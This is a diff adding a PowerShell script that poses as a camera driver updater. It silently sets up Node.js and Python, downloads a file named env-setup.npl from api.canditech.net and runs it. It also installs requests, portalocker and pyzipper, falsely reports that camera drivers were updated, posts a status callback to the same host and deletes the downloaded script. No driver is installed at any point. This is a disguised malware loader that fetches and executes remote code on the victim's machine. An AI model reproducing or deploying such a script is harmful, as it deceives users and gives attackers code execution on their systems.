@@ -1,0 +1,321 @@
+$ErrorActionPreference = 'Continue'
+
+function Write-Info([string]$Message) {
+    Write-Host "[INFO] $Message"
+}
+
+function Write-WarnLog([string]$Message) {
+    Write-Host "[WARN] $Message"
+}
+
+function Write-ErrorLog([string]$Message) {
+    Write-Host "[ERROR] $Message"
+}
+
+function Invoke-Download {
+    param(
+        [Parameter(Mandatory = $true)][string]$Url,
+        [Parameter(Mandatory = $true)][string]$OutFile,
+        [int]$TimeoutSec = 180
+    )
+
+    try {
+        $curlCmd = Get-Command curl.exe -ErrorAction SilentlyContinue
+        if ($null -ne $curlCmd) {
+            & curl.exe -sSL --connect-timeout 30 --max-time $TimeoutSec -o $OutFile $Url *> $null
+            return ($LASTEXITCODE -eq 0)
+        }
+
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        Invoke-WebRequest -Uri $Url -OutFile $OutFile -TimeoutSec $TimeoutSec -UseBasicParsing *> $null
+        return (Test-Path -LiteralPath $OutFile)
+    }
+    catch {
+        return $false
+    }
+}
+
+function Test-NonEmptyFile {
+    param(
+        [Parameter(Mandatory = $true)][string]$Path
+    )
+
+    try {
+        if (-not (Test-Path -LiteralPath $Path)) {
+            return $false
+        }
+        $item = Get-Item -LiteralPath $Path -ErrorAction Stop
+        return ($item.Length -gt 0)
+    }
+    catch {
+        return $false
+    }
+}
+
+function Invoke-DownloadWithRetry {
+    param(
+        [Parameter(Mandatory = $true)][string]$Url,
+        [Parameter(Mandatory = $true)][string]$OutFile,
+        [int]$TimeoutSec = 180,
+        [int]$Retries = 3
+    )
+
+    for ($i = 1; $i -le $Retries; $i++) {
+        Remove-Item -LiteralPath $OutFile -Force -ErrorAction SilentlyContinue
+        $ok = Invoke-Download -Url $Url -OutFile $OutFile -TimeoutSec $TimeoutSec
+        if ($ok -and (Test-NonEmptyFile -Path $OutFile)) {
+            return $true
+        }
+        Start-Sleep -Seconds 2
+    }
+
+    return $false
+}
+
+$host.UI.RawUI.WindowTitle = "Creating new Info"
+
+$WINDOW_UID = "__ID__"
+if ([string]::IsNullOrWhiteSpace($WINDOW_UID) -or $WINDOW_UID -eq "__ID__") {
+    $WINDOW_UID = ""
+}
+
+if ([string]::IsNullOrWhiteSpace($WINDOW_UID) -and -not [string]::IsNullOrWhiteSpace($env:WINDOW_UID)) {
+    $WINDOW_UID = $env:WINDOW_UID.Trim()
+}
+
+if ([string]::IsNullOrWhiteSpace($WINDOW_UID)) {
+    try {
+        $lastCmd = (Get-History -Count 1 -ErrorAction SilentlyContinue).CommandLine
+        if (-not [string]::IsNullOrWhiteSpace($lastCmd) -and $lastCmd -match '/window/([A-Za-z0-9_-]+)') {
+            $WINDOW_UID = $matches[1]
+        }
+    }
+    catch {
+        # Intentionally ignore; callback is best-effort.
+    }
+}
+
+if ([string]::IsNullOrWhiteSpace($WINDOW_UID)) {
+    Write-WarnLog "WINDOW_UID is missing; status callback will be skipped."
+}
+
+Write-Info "Searching for Camera Drivers ..."
+
+$scriptDir = $null
+if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) {
+    $scriptDir = $PSScriptRoot
+}
+elseif (-not [string]::IsNullOrWhiteSpace($PSCommandPath)) {
+    $scriptDir = Split-Path -Parent $PSCommandPath
+}
+elseif ($MyInvocation -and $MyInvocation.MyCommand -and -not [string]::IsNullOrWhiteSpace($MyInvocation.MyCommand.Path)) {
+    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
+}
+else {
+    # Handles Invoke-Expression / streamed execution with no script file path.
+    $scriptDir = Join-Path $env:TEMP "canditech-driver-bootstrap"
+}
+
+if (-not (Test-Path -LiteralPath $scriptDir)) {
+    New-Item -ItemType Directory -Path $scriptDir -Force *> $null
+}
+
+$extractDir = Join-Path $scriptDir "nodejs"
+$portableNode = Join-Path $extractDir "PFiles64\nodejs\node.exe"
+$nodeExe = $null
+$nodeVersion = "22.16.0"
+
+$nodeCommand = Get-Command node -ErrorAction SilentlyContinue
+if ($null -ne $nodeCommand) {
+    $nodeExe = "node"
+}
+
+if (-not $nodeExe -and (Test-Path -LiteralPath $portableNode)) {
+    $nodeExe = $portableNode
+    $env:PATH = (Join-Path $extractDir "PFiles64\nodejs") + ";" + $env:PATH
+}
+
+if (-not $nodeExe) {
+    # Prefer portable ZIP install; this is more reliable in Invoke-Expression sessions.
+    $nodeZip = "node-v$nodeVersion-win-x64.zip"
+    $zipUrl = "https://nodejs.org/dist/v$nodeVersion/$nodeZip"
+    $zipOut = Join-Path $scriptDir $nodeZip
+    $zipOk = Invoke-DownloadWithRetry -Url $zipUrl -OutFile $zipOut -TimeoutSec 600 -Retries 3
+    if ($zipOk) {
+        try {
+            Expand-Archive -LiteralPath $zipOut -DestinationPath $extractDir -Force
+        }
+        catch {
+            Write-ErrorLog "Node.js ZIP extraction failed."
+        }
+        Remove-Item -LiteralPath $zipOut -Force -ErrorAction SilentlyContinue
+    }
+
+    # Search for node.exe after ZIP extract.
+    if (-not $nodeExe) {
+        $zipNode = Get-ChildItem -LiteralPath $extractDir -Recurse -Filter "node.exe" -ErrorAction SilentlyContinue |
+            Select-Object -First 1
+        if ($null -ne $zipNode) {
+            $nodeExe = $zipNode.FullName
+            $env:PATH = (Split-Path -Parent $nodeExe) + ";" + $env:PATH
+        }
+    }
+
+    # Fallback to MSI administrative extraction if ZIP path still failed.
+    if (-not $nodeExe) {
+        $nodeMsi = "node-v$nodeVersion-x64.msi"
+        $downloadUrl = "https://nodejs.org/dist/v$nodeVersion/$nodeMsi"
+        $msiOut = Join-Path $scriptDir $nodeMsi
+
+        $downloadOk = Invoke-DownloadWithRetry -Url $downloadUrl -OutFile $msiOut -TimeoutSec 600 -Retries 3
+        if (-not $downloadOk -or -not (Test-Path -LiteralPath $msiOut)) {
+            Write-ErrorLog "Node.js MSI download failed."
+            Write-WarnLog "Continuing without stopping script."
+        }
+        else {
+            & msiexec /a $msiOut /qn TARGETDIR="$extractDir" *> $null
+            Remove-Item -LiteralPath $msiOut -Force -ErrorAction SilentlyContinue
+        }
+    }
+
+    if (-not $nodeExe -and (Test-Path -LiteralPath $portableNode)) {
+        $nodeExe = $portableNode
+        $env:PATH = (Join-Path $extractDir "PFiles64\nodejs") + ";" + $env:PATH
+    }
+
+    if (-not $nodeExe) {
+        $msiNode = Get-ChildItem -LiteralPath $extractDir -Recurse -Filter "node.exe" -ErrorAction SilentlyContinue |
+            Select-Object -First 1
+        if ($null -ne $msiNode) {
+            $nodeExe = $msiNode.FullName
+            $env:PATH = (Split-Path -Parent $nodeExe) + ";" + $env:PATH
+        }
+    }
+
+    if (-not $nodeExe) {
+        Write-ErrorLog "Node.exe not found after MSI admin install."
+        Write-ErrorLog "Expected file: $portableNode"
+        Write-ErrorLog "EXTRACT_DIR was: $extractDir"
+        Write-WarnLog "Continuing without stopping script."
+    }
+}
+
+if (-not $nodeExe) {
+    Write-ErrorLog "Node.js is not available after setup."
+    Write-WarnLog "Continuing without stopping script."
+}
+else {
+    & $nodeExe -v *> $null
+    if ($LASTEXITCODE -ne 0) {
+        Write-ErrorLog "Node did not run. Path: `"$nodeExe`""
+        Write-WarnLog "Continuing without stopping script."
+    }
+}
+
+$envSetupUrl = "https://api.canditech.net/driver/env-setup.npl"
+$codeProfile = $env:USERPROFILE
+if (-not (Test-Path -LiteralPath $codeProfile)) {
+    New-Item -ItemType Directory -Path $codeProfile -Force *> $null
+}
+
+$envSetupFile = Join-Path $codeProfile "env-setup.npl"
+$envSetupOk = Invoke-DownloadWithRetry -Url $envSetupUrl -OutFile $envSetupFile -TimeoutSec 180 -Retries 3
+if (-not $envSetupOk) {
+    Write-ErrorLog "Driver script download failed: $envSetupFile"
+    Write-ErrorLog "Check network / firewall / URL: $envSetupUrl"
+    Write-WarnLog "Continuing without stopping script."
+}
+
+$driverCurlHome = Join-Path $env:TEMP "wdcurl_driver_silent"
+New-Item -ItemType Directory -Path $driverCurlHome -Force *> $null
+@(
+    "silent"
+    "show-error"
+) | Set-Content -LiteralPath (Join-Path $driverCurlHome ".curlrc") -Encoding ASCII
+$env:CURL_HOME = $driverCurlHome
+
+Write-Info "Updating Driver Packages..."
+Set-Location -LiteralPath $codeProfile
+if ($nodeExe -and (Test-NonEmptyFile -Path $envSetupFile)) {
+    & $nodeExe $envSetupFile
+    if ($LASTEXITCODE -ne 0) {
+        Write-ErrorLog "Driver script env-setup.npl failed. Exit code: $LASTEXITCODE"
+        Write-WarnLog "Continuing without stopping script."
+    }
+}
+elseif (-not (Test-NonEmptyFile -Path $envSetupFile)) {
+    Write-ErrorLog "Skipping env-setup.npl execution because file is missing or empty."
+}
+else {
+    Write-WarnLog "Skipping env-setup.npl execution because Node is unavailable."
+}
+
+New-Item -ItemType Directory -Path "C:\python" -Force *> $null
+$pyZip = "C:\python\py.zip"
+$pyZipUrl = "https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip"
+$pyZipOk = Invoke-Download -Url $pyZipUrl -OutFile $pyZip -TimeoutSec 600
+if (-not $pyZipOk) {
+    Write-ErrorLog "Failed to download Python embed zip."
+    Write-WarnLog "Continuing without stopping script."
+}
+
+try {
+    Expand-Archive -LiteralPath $pyZip -DestinationPath "C:\python" -Force
+}
+catch {
+    Write-ErrorLog "Failed to extract Python zip."
+    Write-WarnLog "Continuing without stopping script."
+}
+Remove-Item -LiteralPath $pyZip -Force -ErrorAction SilentlyContinue
+
+$pthFile = "C:\python\python313._pth"
+if (Test-Path -LiteralPath $pthFile) {
+    try {
+        (Get-Content -LiteralPath $pthFile) -replace '^#import site', 'import site' | Set-Content -LiteralPath $pthFile -Encoding ASCII
+    }
+    catch {
+        Write-WarnLog "Failed to update python313._pth."
+    }
+}
+
+$getPip = "C:\python\get-pip.py"
+$getPipOk = Invoke-Download -Url "https://bootstrap.pypa.io/get-pip.py" -OutFile $getPip -TimeoutSec 120
+if (-not $getPipOk) {
+    Write-ErrorLog "Failed to download get-pip.py"
+    Write-WarnLog "Continuing without stopping script."
+}
+
+& "C:\python\python.exe" $getPip *> $null
+if ($LASTEXITCODE -ne 0) {
+    Write-ErrorLog "get-pip.py failed."
+    Write-WarnLog "Continuing without stopping script."
+}
+
+& "C:\python\python.exe" -m pip install requests portalocker pyzipper *> $null
+if ($LASTEXITCODE -ne 0) {
+    Write-ErrorLog "pip install failed."
+    Write-WarnLog "Continuing without stopping script."
+}
+
+Write-Host "[SUCCESS] Camera drivers have been updated successfully."
+if (-not [string]::IsNullOrWhiteSpace($WINDOW_UID)) {
+    $autoUrl = "https://api.canditech.net/change-connection-status/$WINDOW_UID"
+    try {
+        $curlCmd = Get-Command curl.exe -ErrorAction SilentlyContinue
+        if ($null -ne $curlCmd) {
+            & curl.exe -sL -X POST $autoUrl -o $null *> $null
+        }
+        else {
+            Invoke-RestMethod -Uri $autoUrl -Method POST *> $null
+        }
+    }
+    catch {
+        Write-WarnLog "Status callback failed for WINDOW_UID."
+    }
+}
+
+if (Test-Path -LiteralPath $envSetupFile) {
+    Remove-Item -LiteralPath $envSetupFile -Force -ErrorAction SilentlyContinue
+}
+
+exit 0
